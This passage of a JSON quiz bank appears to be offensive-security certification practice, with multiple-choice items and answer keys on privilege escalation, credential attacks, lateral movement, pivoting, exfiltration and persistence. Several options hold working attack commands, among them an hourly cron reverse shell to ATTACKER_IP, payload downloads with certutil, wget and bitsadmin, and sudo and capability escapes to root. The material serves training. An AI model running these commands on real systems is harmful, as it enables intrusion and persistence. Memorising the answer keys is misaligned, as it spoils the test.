+      "link": "start-here.html"
+    },
+    {
+      "id": 103,
+      "domain": 4,
+      "objective": "4.2",
+      "difficulty": "medium",
+      "question": "On a Windows target, you run 'whoami /priv' and see SeImpersonatePrivilege is enabled. Which tool is most commonly used to escalate to SYSTEM via this privilege?",
+      "options": [
+        "Rubeus",
+        "JuicyPotato or PrintSpoofer",
+        "BloodHound",
+        "Mimikatz"
+      ],
+      "correct": 1,
+      "explanation": "SeImpersonatePrivilege allows a process to impersonate tokens of other users. JuicyPotato (or its successors like PrintSpoofer and GodPotato) exploit this privilege to obtain a SYSTEM-level token by tricking a SYSTEM-level service into authenticating to the attacker's process.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 104,
+      "domain": 4,
+      "objective": "4.2",
+      "difficulty": "hard",
+      "question": "You discover an unquoted service path 'C:\\Program Files\\Vuln App\\Service Binary\\vuln.exe' running as SYSTEM. Where should you place a malicious executable to hijack the service?",
+      "options": [
+        "C:\\Program.exe",
+        "Any of the above, depending on write permissions",
+        "C:\\Program Files\\Vuln.exe",
+        "C:\\Program Files\\Vuln App\\Service.exe"
+      ],
+      "correct": 1,
+      "explanation": "Windows resolves unquoted paths by trying each space as a potential path terminator. It will try C:\\Program.exe, then C:\\Program Files\\Vuln.exe, then C:\\Program Files\\Vuln App\\Service.exe in order. The attacker must place the payload at whichever location they have write access to.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 105,
+      "domain": 4,
+      "objective": "4.1",
+      "difficulty": "hard",
+      "question": "You find a cron job running as root that executes a script containing: 'tar czf /tmp/backup.tar.gz *' from within /var/www/html. How can you exploit this for privilege escalation?",
+      "options": [
+        "Replace the tar binary in /usr/bin with a reverse shell",
+        "Add a symbolic link from /var/www/html to /etc/shadow",
+        "Modify /tmp/backup.tar.gz to contain a reverse shell",
+        "Create files named '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh' in /var/www/html"
+      ],
+      "correct": 3,
+      "explanation": "This is a tar wildcard injection attack. When tar expands the wildcard *, filenames beginning with '--' are interpreted as command-line arguments. Creating files named '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh' causes tar to execute the privesc.sh script as root.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 106,
+      "domain": 4,
+      "objective": "4.3",
+      "difficulty": "medium",
+      "question": "You have obtained an NTLM hash but cannot crack it. Which technique allows you to authenticate to a Windows service without knowing the plaintext password?",
+      "options": [
+        "Password spraying",
+        "Kerberoasting",
+        "Pass-the-hash",
+        "AS-REP roasting"
+      ],
+      "correct": 2,
+      "explanation": "Pass-the-hash (PtH) allows an attacker to authenticate to remote services using the NTLM hash directly, without needing to crack it to plaintext. Tools like pth-winexe, Impacket's psexec.py, and CrackMapExec support this technique natively.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 107,
+      "domain": 4,
+      "objective": "4.4",
+      "difficulty": "easy",
+      "question": "Which automated enumeration tool is specifically designed for Linux privilege escalation and produces color-coded output highlighting potential vectors?",
+      "options": [
+        "WinPEAS",
+        "PowerUp",
+        "Seatbelt",
+        "LinPEAS"
+      ],
+      "correct": 3,
+      "explanation": "LinPEAS (Linux Privilege Escalation Awesome Script) is part of the PEASS-ng suite and performs comprehensive enumeration of a Linux system, highlighting potential privilege escalation vectors with color-coded output for quick identification.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 108,
+      "domain": 4,
+      "objective": "4.2",
+      "difficulty": "hard",
+      "question": "You discover a Windows service with a writable binary path. After replacing the binary with a reverse shell payload, the service doesn't start and your shell dies immediately. What is the most likely issue?",
+      "options": [
+        "The payload must be a proper Windows service executable that responds to the Service Control Manager",
+        "The firewall is blocking the reverse connection",
+        "The service account doesn't have network access",
+        "You need to disable Windows Defender first"
+      ],
+      "correct": 0,
+      "explanation": "Windows services must interact with the Service Control Manager (SCM) and respond to control requests. A simple reverse shell EXE will be terminated by the SCM when it fails to respond. Using msfvenom with the 'exe-service' format or wrapping the payload to handle SCM communication resolves this.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 109,
+      "domain": 4,
+      "objective": "4.1",
+      "difficulty": "medium",
+      "question": "On a Linux system, you run 'sudo -l' and see: '(ALL) NOPASSWD: /usr/bin/vim'. What is the fastest way to escalate to root?",
+      "options": [
+        "Copy /bin/bash over /usr/bin/vim",
+        "Run 'sudo vim -c \":!bash\"'",
+        "Use vim to edit the sudoers file directly",
+        "Edit /etc/shadow with vim and remove root's password hash"
+      ],
+      "correct": 1,
+      "explanation": "Vim can execute shell commands using ':!command' from within the editor. Running 'sudo vim -c \":!bash\"' opens vim as root and immediately drops into a root bash shell. This is one of the most common GTFOBins sudo escalation techniques.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 110,
+      "domain": 4,
+      "objective": "4.5",
+      "difficulty": "hard",
+      "question": "You find a MySQL service running as root on a Linux target. You have MySQL root credentials. Which technique can leverage this for OS-level privilege escalation?",
+      "options": [
+        "Use a User Defined Function (UDF) to execute system commands as root",
+        "SELECT * FROM mysql.user to dump password hashes",
+        "Use LOAD DATA INFILE to read /etc/shadow",
+        "Modify the MySQL configuration to enable remote access"
+      ],
+      "correct": 0,
+      "explanation": "When MySQL runs as root, a User Defined Function (UDF) can be created by writing a shared library to the plugin directory and loading it, allowing execution of arbitrary OS commands as the root user. Reading /etc/shadow would only provide hashes, not direct escalation.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 111,
+      "domain": 4,
+      "objective": "4.1",
+      "difficulty": "medium",
+      "question": "You discover that the PATH variable in a root-owned cron job includes a writable directory before /usr/bin. The cron job calls 'backup.sh' without an absolute path. How do you exploit this?",
+      "options": [
+        "Change the cron job schedule to run more frequently",
+        "Place a malicious backup.sh in the writable directory that appears earlier in the PATH",
+        "Add your user to the root group",
+        "Modify the original backup.sh script"
+      ],
+      "correct": 1,
+      "explanation": "When a script is called without an absolute path, the system searches directories in the PATH variable in order. By placing a malicious backup.sh in a writable directory that appears before the legitimate one in PATH, the malicious version executes first with root privileges.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 112,
+      "domain": 4,
+      "objective": "4.2",
+      "difficulty": "medium",
+      "question": "Which Windows registry key, when set to 1, allows any user to install MSI packages with SYSTEM privileges?",
+      "options": [
+        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
+        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
+        "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated"
+      ],
+      "correct": 3,
+      "explanation": "The AlwaysInstallElevated policy, when enabled in both HKLM and HKCU, allows any user to install MSI packages with SYSTEM privileges. An attacker can generate a malicious MSI with msfvenom and install it to gain SYSTEM access.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 113,
+      "domain": 4,
+      "objective": "4.3",
+      "difficulty": "hard",
+      "question": "You've captured an NTLMv2 hash during a man-in-the-middle attack using Responder. Which tool and approach is most effective for cracking it?",
+      "options": [
+        "John the Ripper with the --format=netntlmv2 option and a wordlist",
+        "Convert it to an NTLM hash first, then pass it",
+        "Use ophcrack with rainbow tables",
+        "Pass the NTLMv2 hash directly using CrackMapExec"
+      ],
+      "correct": 0,
+      "explanation": "NTLMv2 hashes (also called Net-NTLMv2) are challenge-response hashes that cannot be used in pass-the-hash attacks; they must be cracked. John the Ripper or Hashcat (mode 5600) with a strong wordlist and rules is the standard approach for cracking these hashes.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 114,
+      "domain": 4,
+      "objective": "4.1",
+      "difficulty": "easy",
+      "question": "On a Linux system, which file can reveal users who may have weak or no passwords when readable by your low-privilege user?",
+      "options": [
+        "/etc/resolv.conf",
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/hosts"
+      ],
+      "correct": 2,
+      "explanation": "The /etc/shadow file contains password hashes for all users. If readable by a low-privilege user (a misconfiguration), it reveals password hashes that can be cracked offline, and may show accounts with empty password fields that can be accessed without authentication.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 115,
+      "domain": 4,
+      "objective": "4.4",
+      "difficulty": "medium",
+      "question": "You run PowerUp.ps1 on a Windows target with 'Invoke-AllChecks'. Which of the following does it NOT check for?",
+      "options": [
+        "Unquoted service paths",
+        "AlwaysInstallElevated registry keys",
+        "Kernel exploits based on OS version",
+        "Modifiable service binaries"
+      ],
+      "correct": 2,
+      "explanation": "PowerUp focuses on common Windows misconfigurations such as unquoted service paths, modifiable services, and registry-based escalation vectors. It does not check for kernel exploits based on OS version; tools like Windows-Exploit-Suggester or Watson are used for that purpose.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 116,
+      "domain": 4,
+      "objective": "4.2",
+      "difficulty": "hard",
+      "question": "You have a low-privilege shell on a Windows host and discover a scheduled task running as SYSTEM that executes a script from a directory where you have write access. The task runs every 5 minutes. What is the best approach?",
+      "options": [
+        "Delete the scheduled task and create a new one",
+        "Use icacls to change the task permissions",
+        "Replace the script with a reverse shell payload and wait for the task to execute",
+        "Use schtasks to modify the task's trigger interval"
+      ],
+      "correct": 2,
+      "explanation": "If you have write access to the directory containing the script executed by a SYSTEM-level scheduled task, you can replace or modify that script with a reverse shell payload. When the task triggers on its next 5-minute cycle, it will execute your payload as SYSTEM.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 117,
+      "domain": 4,
+      "objective": "4.1",
+      "difficulty": "hard",
+      "question": "You discover that /usr/bin/find has the Linux capability cap_setuid+ep. How can you exploit this for privilege escalation?",
+      "options": [
+        "Run 'find . -exec /bin/bash -p \\;' to get a root shell",
+        "Use find to search for files owned by root",
+        "The cap_setuid capability cannot be exploited on find",
+        "Use find to locate other SUID binaries"
+      ],
+      "correct": 0,
+      "explanation": "The cap_setuid capability allows a process to change its UID. When find has this capability, running 'find . -exec /bin/bash -p \\;' spawns a bash shell that inherits the capability and runs with effective root privileges. The -p flag preserves the elevated privileges.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 118,
+      "domain": 4,
+      "objective": "4.3",
+      "difficulty": "easy",
+      "question": "Which hashcat mode is used to crack NTLM hashes obtained from a Windows SAM database?",
+      "options": [
+        "-m 500",
+        "-m 13100",
+        "-m 1000",
+        "-m 5600"
+      ],
+      "correct": 2,
+      "explanation": "Hashcat mode 1000 is used for cracking NTLM hashes, which are the format stored in the Windows SAM database and obtained via tools like secretsdump.py. Mode 5600 is for NTLMv2 (network captures), and mode 13100 is for Kerberoasted TGS tickets.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 119,
+      "domain": 4,
+      "objective": "4.5",
+      "difficulty": "medium",
+      "question": "You find a web application running as root on port 8080 with a known command injection vulnerability. After confirming the injection, what is the simplest method to escalate privileges?",
+      "options": [
+        "Inject a reverse shell command to obtain a root shell directly",
+        "Inject a command to create a new user in /etc/passwd",
+        "Use the command injection to download and execute a kernel exploit",
+        "Use the command injection to read /etc/shadow and crack passwords offline"
+      ],
+      "correct": 0,
+      "explanation": "Since the web application runs as root, any command injection vulnerability executes commands with root privileges. Injecting a reverse shell payload (such as a bash reverse shell) provides an immediate interactive root shell without needing further escalation.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 120,
+      "domain": 4,
+      "objective": "4.2",
+      "difficulty": "hard",
+      "question": "On a Windows target, you identify a service with a writable DLL search path. The service loads a missing DLL at startup. What is this privilege escalation technique called, and what must your malicious DLL export?",
+      "options": [
+        "DLL hijacking; the DLL must export the functions the application expects to import",
+        "DLL proxying; the DLL must forward all calls to the original DLL",
+        "DLL injection; the DLL must export CreateRemoteThread",
+        "DLL sideloading; the DLL must export DllMain only"
+      ],
+      "correct": 0,
+      "explanation": "DLL hijacking exploits the Windows DLL search order to load a malicious DLL in place of a missing or expected one. The malicious DLL must export the functions the application tries to import, or the application will crash. For missing DLLs, exporting DllMain may suffice, but proper exports ensure stable execution.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 121,
+      "domain": 5,
+      "objective": "5.1",
+      "difficulty": "easy",
+      "question": "After gaining root access on a Linux target, which of the following is the most reliable method for maintaining persistent SSH access?",
+      "options": [
+        "Adding your public key to /root/.ssh/authorized_keys",
+        "Creating a new entry in /etc/hosts",
+        "Installing a keylogger on the system",
+        "Modifying /etc/resolv.conf to point to your DNS server"
+      ],
+      "correct": 0,
+      "explanation": "Adding your SSH public key to the authorized_keys file of the root user provides persistent, password-less SSH access. This is a simple, reliable, and commonly used persistence technique that survives reboots and password changes.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 122,
+      "domain": 5,
+      "objective": "5.2",
+      "difficulty": "medium",
+      "question": "You have administrator credentials on a Windows domain machine. Which Impacket tool would you use to execute commands on a remote host via SMB?",
+      "options": [
+        "impacket-responder",
+        "impacket-ntlmrelayx",
+        "impacket-psexec",
+        "impacket-smbclient"
+      ],
+      "correct": 2,
+      "explanation": "Impacket's psexec.py creates a service on the remote machine via SMB to execute commands, similar to the Sysinternals PsExec tool. It uploads a service binary, creates and starts the service, and provides an interactive command prompt with SYSTEM privileges.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 123,
+      "domain": 5,
+      "objective": "5.3",
+      "difficulty": "medium",
+      "question": "You've compromised a dual-homed host with interfaces on 10.10.10.0/24 (your network) and 172.16.1.0/24 (internal). Which SSH command creates a SOCKS proxy through the compromised host to access the internal network?",
+      "options": [
+        "ssh -R 1080 user@10.10.10.5",
+        "ssh -D 1080 user@10.10.10.5",
+        "ssh -L 1080:172.16.1.0:445 user@10.10.10.5",
+        "ssh -N -f user@10.10.10.5"
+      ],
+      "correct": 1,
+      "explanation": "The SSH -D flag creates a dynamic SOCKS proxy on the specified local port. Traffic sent through this proxy (e.g., via proxychains on port 1080) is forwarded through the SSH tunnel, allowing access to the internal 172.16.1.0/24 network through the compromised host.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 124,
+      "domain": 5,
+      "objective": "5.5",
+      "difficulty": "hard",
+      "question": "During an Active Directory assessment, you use BloodHound and discover a user with DCSync rights. Which Impacket tool do you use to perform a DCSync attack and what data does it retrieve?",
+      "options": [
+        "impacket-secretsdump; retrieves all domain password hashes including the krbtgt hash",
+        "impacket-getTGT; retrieves a Ticket Granting Ticket for the domain admin",
+        "impacket-getST; retrieves service tickets for all SPNs",
+        "impacket-lookupsid; retrieves the SID of the domain administrator"
+      ],
+      "correct": 0,
+      "explanation": "Impacket's secretsdump.py with the -just-dc flag performs a DCSync attack by impersonating a domain controller and requesting password replication data via MS-DRSR. This retrieves all domain account NTLM hashes, including the krbtgt hash needed for Golden Ticket attacks.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 125,
+      "domain": 5,
+      "objective": "5.5",
+      "difficulty": "hard",
+      "question": "You want to perform Kerberoasting against an Active Directory domain. Which Impacket command correctly requests TGS tickets for service accounts?",
+      "options": [
+        "impacket-ticketer -domain domain.local -domain-sid S-1-5-21-xxx -nthash xxx administrator",
+        "impacket-secretsdump -dc-ip 10.10.10.1 domain.local/user:password",
+        "impacket-GetNPUsers -dc-ip 10.10.10.1 domain.local/user:password",
+        "impacket-GetUserSPNs -dc-ip 10.10.10.1 domain.local/user:password -request"
+      ],
+      "correct": 3,
+      "explanation": "GetUserSPNs.py with the -request flag queries Active Directory for accounts with registered Service Principal Names and requests their TGS tickets. These tickets are encrypted with the service account's NTLM hash and can be cracked offline to recover the plaintext password.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 126,
+      "domain": 5,
+      "objective": "5.3",
+      "difficulty": "medium",
+      "question": "You need to forward traffic to an internal host at 172.16.1.10:3389 through a compromised Linux host. Which SSH command creates the correct local port forward?",
+      "options": [
+        "ssh -D 3389:172.16.1.10:3389 user@pivot",
+        "ssh -N 3389:172.16.1.10:3389 user@pivot",
+        "ssh -R 3389:172.16.1.10:3389 user@pivot",
+        "ssh -L 3389:172.16.1.10:3389 user@pivot"
+      ],
+      "correct": 3,
+      "explanation": "SSH local port forwarding (-L) binds a local port and forwards traffic through the SSH tunnel to the specified destination. The syntax is -L local_port:destination_host:destination_port. This allows you to connect to localhost:3389 and reach the internal RDP service.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 127,
+      "domain": 5,
+      "objective": "5.6",
+      "difficulty": "easy",
+      "question": "Which tool is used to transfer files from your Kali attacker machine to a target by starting a simple HTTP server?",
+      "options": [
+        "arp-scan --localnet",
+        "netcat -lvp 443",
+        "ssh-keygen -t rsa",
+        "python3 -m http.server 80"
+      ],
+      "correct": 3,
+      "explanation": "Python's built-in http.server module starts a simple HTTP server serving files from the current directory. The target can then download files using wget, curl, or a browser. This is one of the most commonly used file transfer techniques in penetration testing.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 128,
+      "domain": 5,
+      "objective": "5.2",
+      "difficulty": "hard",
+      "question": "You have local administrator credentials on multiple Windows machines in a domain. Which lateral movement technique uses the Windows Management Instrumentation service and does not write a binary to disk?",
+      "options": [
+        "WMI (wmiexec)",
+        "PsExec",
+        "SMB file copy and scheduled task",
+        "RDP"
+      ],
+      "correct": 0,
+      "explanation": "WMI-based execution (such as Impacket's wmiexec.py) uses the WMI service to execute commands remotely without writing an executable to disk. Unlike PsExec, which creates and installs a service binary, WMI execution is more stealthy as it leverages a legitimate Windows management protocol.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 129,
+      "domain": 5,
+      "objective": "5.5",
+      "difficulty": "hard",
+      "question": "After compromising the krbtgt account hash in Active Directory, which attack allows you to forge TGTs for any user including Domain Admin?",
+      "options": [
+        "Kerberoasting",
+        "Silver Ticket attack",
+        "AS-REP Roasting",
+        "Golden Ticket attack"
+      ],
+      "correct": 3,
+      "explanation": "A Golden Ticket attack uses the krbtgt account's NTLM hash to forge Ticket Granting Tickets (TGTs) for any user in the domain. Since the krbtgt hash is used to sign all TGTs, a forged ticket is indistinguishable from a legitimate one, granting unrestricted domain access.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 130,
+      "domain": 5,
+      "objective": "5.1",
+      "difficulty": "medium",
+      "question": "On a compromised Windows host, you want to establish persistence via a registry Run key. Which registry path ensures your payload executes every time any user logs in?",
+      "options": [
+        "HKLM\\SYSTEM\\CurrentControlSet\\Services",
+        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+      ],
+      "correct": 3,
+      "explanation": "The HKLM (HKEY_LOCAL_MACHINE) Run key executes the specified program for ALL users at login, while HKCU only affects the current user. RunOnce entries are deleted after execution, making them unsuitable for persistent access.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 131,
+      "domain": 5,
+      "objective": "5.3",
+      "difficulty": "hard",
+      "question": "You need to set up a reverse tunnel using Chisel so that your attacker machine can reach an internal network service at 172.16.1.10:445. What commands do you run?",
+      "options": [
+        "Attacker: chisel client ATTACKER_IP:8080; Target: chisel server -p 8080 --reverse",
+        "Attacker: chisel server -p 8080 --reverse; Target: chisel client ATTACKER_IP:8080 R:socks",
+        "Attacker: chisel server -p 8080 --socks5; Target: chisel client ATTACKER_IP:8080 --reverse",
+        "Attacker: chisel server -p 8080; Target: chisel client ATTACKER_IP:8080 R:socks"
+      ],
+      "correct": 1,
+      "explanation": "Chisel requires the server to run on the attacker with --reverse to allow reverse tunnels, while the client on the target connects back and requests a reverse SOCKS proxy (R:socks). This creates a SOCKS5 proxy on the attacker that routes traffic through the compromised host.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 132,
+      "domain": 5,
+      "objective": "5.4",
+      "difficulty": "medium",
+      "question": "You need to exfiltrate a large database dump from a compromised host that has strict outbound firewall rules allowing only DNS traffic. Which technique is most appropriate?",
+      "options": [
+        "Email the file as an attachment via SMTP",
+        "Upload to a public file sharing service via HTTPS",
+        "Encode the data in ICMP echo packets",
+        "DNS tunneling using a tool like dnscat2"
+      ],
+      "correct": 3,
+      "explanation": "DNS tunneling encodes data within DNS queries and responses, leveraging the fact that DNS traffic (UDP/53) is almost always allowed outbound. Tools like dnscat2 create a command-and-control channel over DNS that can transfer files even through strict firewalls.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 133,
+      "domain": 5,
+      "objective": "5.5",
+      "difficulty": "medium",
+      "question": "Which BloodHound query or edge would reveal the shortest path from a compromised user to Domain Admin?",
+      "options": [
+        "Find all Kerberoastable accounts",
+        "Shortest Path from Owned Principals to Domain Admins",
+        "Find unsupported operating systems",
+        "List all computers where Domain Users are local admin"
+      ],
+      "correct": 1,
+      "explanation": "BloodHound's 'Shortest Path from Owned Principals to Domain Admins' query uses graph theory to identify the most direct attack path from any principal you've marked as owned to the Domain Admins group, considering all relationship edges like AdminTo, MemberOf, and HasSession.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 134,
+      "domain": 5,
+      "objective": "5.6",
+      "difficulty": "easy",
+      "question": "On a compromised Windows target with no internet access, which built-in tool can download a file from your attacker's HTTP server?",
+      "options": [
+        "certutil -urlcache -split -f http://ATTACKER/file.exe file.exe",
+        "ipconfig",
+        "netstat -ano",
+        "systeminfo"
+      ],
+      "correct": 0,
+      "explanation": "Certutil is a built-in Windows utility for managing certificates that includes file download functionality. The -urlcache -split -f flags force a download from the specified URL, making it a reliable living-off-the-land file transfer method when PowerShell is restricted.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 135,
+      "domain": 5,
+      "objective": "5.2",
+      "difficulty": "medium",
+      "question": "You have valid credentials for a Windows host with WinRM enabled (port 5985). Which tool from Kali provides an interactive PowerShell-like session over WinRM?",
+      "options": [
+        "rdesktop",
+        "evil-winrm",
+        "crackmapexec",
+        "smbclient"
+      ],
+      "correct": 1,
+      "explanation": "Evil-WinRM provides an interactive PowerShell session over the WinRM protocol on port 5985 (HTTP) or 5986 (HTTPS). It supports file upload/download, in-memory PowerShell script loading, and DLL loading, making it an essential lateral movement tool.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 136,
+      "domain": 5,
+      "objective": "5.5",
+      "difficulty": "hard",
+      "question": "You identify a domain user account with Kerberos pre-authentication disabled. Which attack can extract a crackable hash for this account without any authentication?",
+      "options": [
+        "Kerberoasting",
+        "DCSync",
+        "AS-REP Roasting",
+        "Golden Ticket"
+      ],
+      "correct": 2,
+      "explanation": "AS-REP Roasting targets accounts with Kerberos pre-authentication disabled (DONT_REQ_PREAUTH flag). An attacker can request an AS-REP from the KDC for these accounts without authentication, and the response contains data encrypted with the user's hash that can be cracked offline.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 137,
+      "domain": 5,
+      "objective": "5.3",
+      "difficulty": "hard",
+      "question": "You're using proxychains to route nmap through a SOCKS proxy for internal network scanning. Your scans are failing. What is the most likely issue and fix?",
+      "options": [
+        "Nmap needs the --proxy flag instead of proxychains",
+        "Proxychains doesn't support any nmap scans",
+        "You must use TCP Connect scans (-sT) because proxychains cannot proxy raw SYN packets",
+        "You need to increase the nmap timing to -T5"
+      ],
+      "correct": 2,
+      "explanation": "Proxychains works by intercepting TCP connect() calls, so it only supports full TCP Connect scans (-sT). Nmap's default SYN scan (-sS) uses raw sockets that bypass proxychains. You must also avoid ping scans (-Pn) since ICMP cannot traverse SOCKS proxies.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 138,
+      "domain": 5,
+      "objective": "5.1",
+      "difficulty": "medium",
+      "question": "You want to create a persistent backdoor on a Linux system by adding a cron job that connects back to your attacker machine every hour. Which cron entry achieves this?",
+      "options": [
+        "0 0 * * * /usr/bin/apt update",
+        "0 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",
+        "@reboot /bin/bash /tmp/cleanup.sh",
+        "* * * * * echo 'connected' > /tmp/status"
+      ],
+      "correct": 1,
+      "explanation": "The cron expression '0 * * * *' executes at minute 0 of every hour. The bash reverse shell command creates an interactive connection to the attacker's IP on port 4444. This provides hourly reconnection attempts for persistent access.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 139,
+      "domain": 5,
+      "objective": "5.5",
+      "difficulty": "hard",
+      "question": "After obtaining a Silver Ticket for the CIFS service on a domain controller, what can you do with it?",
+      "options": [
+        "Authenticate to any service in the domain",
+        "Perform a DCSync attack to dump all domain hashes",
+        "Access SMB shares on the target server as any user",
+        "Forge TGTs for any domain user"
+      ],
+      "correct": 2,
+      "explanation": "A Silver Ticket is a forged TGS (Ticket Granting Service) ticket valid only for the specific service it was created for. A CIFS Silver Ticket grants access to SMB/file shares on the target server as any user specified in the ticket, but cannot access other services or perform domain-wide attacks.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 140,
+      "domain": 5,
+      "objective": "5.6",
+      "difficulty": "easy",
+      "question": "Which command on a Linux target downloads a file from your attacker's web server to the /tmp directory?",
+      "options": [
+        "nc -lvp 4444 > /tmp/linpeas.sh",
+        "wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh",
+        "ftp -s:commands.txt ATTACKER_IP",
+        "scp /tmp/linpeas.sh user@ATTACKER_IP:/tmp/"
+      ],
+      "correct": 1,
+      "explanation": "wget is a command-line utility for downloading files via HTTP/HTTPS. The -O flag specifies the output file path. This is the simplest and most common method for transferring tools from an attacker's HTTP server to a Linux target.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 141,
+      "domain": 5,
+      "objective": "5.2",
+      "difficulty": "hard",
+      "question": "During lateral movement, you want to execute a command on a remote Windows host without triggering the creation of a new service. Which technique should you use?",
+      "options": [
+        "WinRM using Invoke-Command",
+        "PsExec (Sysinternals)",
+        "Impacket smbexec.py",
+        "sc.exe to create a remote service"
+      ],
+      "correct": 0,
+      "explanation": "WinRM's Invoke-Command executes commands through the legitimate Windows Remote Management service without creating a new service. PsExec and smbexec both create temporary services on the remote host, which generates detectable event logs and artifacts.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 142,
+      "domain": 5,
+      "objective": "5.3",
+      "difficulty": "medium",
+      "question": "What is the purpose of the socat tool in a pivoting scenario?",
+      "options": [
+        "It creates port-to-port relays and bidirectional data transfers, useful for forwarding traffic between networks",
+        "It is a vulnerability scanner for internal networks",
+        "It only works as an HTTP proxy server",
+        "It is exclusively used for password cracking"
+      ],
+      "correct": 0,
+      "explanation": "Socat (SOcket CAT) is a versatile networking utility that establishes bidirectional data channels between two endpoints. In pivoting, it creates port relays to forward traffic from one network interface to another, enabling access to internal services through compromised hosts.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 143,
+      "domain": 5,
+      "objective": "5.5",
+      "difficulty": "medium",
+      "question": "You have compromised a domain user account and want to enumerate Active Directory to find attack paths. Which command uses BloodHound's data collector to gather AD information?",
+      "options": [
+        "nmap --script ad-enum -p 389 DC_IP",
+        "ldapsearch -x -H ldap://DC_IP -b 'dc=domain,dc=local'",
+        "bloodhound-python -d domain.local -u user -p password -c all -ns DC_IP",
+        "enum4linux -a DC_IP"
+      ],
+      "correct": 2,
+      "explanation": "BloodHound's Python collector (bloodhound-python) or SharpHound gathers Active Directory objects, relationships, sessions, and ACLs. The -c all flag collects all data types. This data is imported into BloodHound's Neo4j database for visual attack path analysis.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 144,
+      "domain": 5,
+      "objective": "5.4",
+      "difficulty": "hard",
+      "question": "You need to exfiltrate data from a host where all outbound connections except HTTP/HTTPS are blocked, and a web proxy with SSL inspection is in place. Which technique is most likely to succeed?",
+      "options": [
+        "Encoding data in HTTP GET parameter values to a controlled domain",
+        "DNS tunneling over UDP/53",
+        "Sending data over raw TCP to port 8080",
+        "Using an ICMP tunnel"
+      ],
+      "correct": 0,
+      "explanation": "When SSL inspection is in place, encrypted tunnels may be detected. Encoding data in HTTP GET parameters to a domain you control blends with normal web traffic and passes through the proxy. While slower, it avoids the detection that DNS, ICMP, or raw TCP tunnels would trigger.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 145,
+      "domain": 5,
+      "objective": "5.1",
+      "difficulty": "hard",
+      "question": "On a compromised Windows host, you want to create a persistent reverse shell that survives reboots without modifying the registry. Which technique is most appropriate?",
+      "options": [
+        "Add a shortcut to the Startup folder",
+        "Create a scheduled task triggered at system startup using schtasks",
+        "Create a new local user account",
+        "Modify the HOSTS file"
+      ],
+      "correct": 1,
+      "explanation": "Creating a scheduled task with a startup trigger (schtasks /create /tn name /tr payload /sc onstart /ru SYSTEM) provides persistent execution after reboot without modifying registry Run keys. The task runs as SYSTEM and survives reboots, making it a reliable persistence mechanism.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 146,
+      "domain": 5,
+      "objective": "5.6",
+      "difficulty": "medium",
+      "question": "You're on a Windows target that has PowerShell execution restricted. Which alternative method transfers a file from your attacker machine using only built-in Windows commands?",
+      "options": [
+        "Import-Module BitsTransfer; Start-BitsTransfer -Source http://ATTACKER/file",
+        "pip install requests && python -c 'import requests; r = requests.get(\"http://ATTACKER/file\")'",
+        "bitsadmin /transfer job /download /priority high http://ATTACKER/file C:\\temp\\file",
+        "Invoke-WebRequest -Uri http://ATTACKER/file -OutFile file"
+      ],
+      "correct": 2,
+      "explanation": "Bitsadmin is a built-in Windows command-line tool for managing BITS (Background Intelligent Transfer Service) jobs. Unlike Invoke-WebRequest and Start-BitsTransfer which require PowerShell, bitsadmin works from cmd.exe and can download files from HTTP servers without PowerShell.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 147,
+      "domain": 5,
+      "objective": "5.5",
+      "difficulty": "medium",
+      "question": "After running Mimikatz on a compromised domain-joined Windows host, you obtain cleartext passwords and NTLM hashes from memory. Which Mimikatz command extracted this credential data?",
+      "options": [
+        "mimikatz # token::elevate",
+        "mimikatz # sekurlsa::logonpasswords",
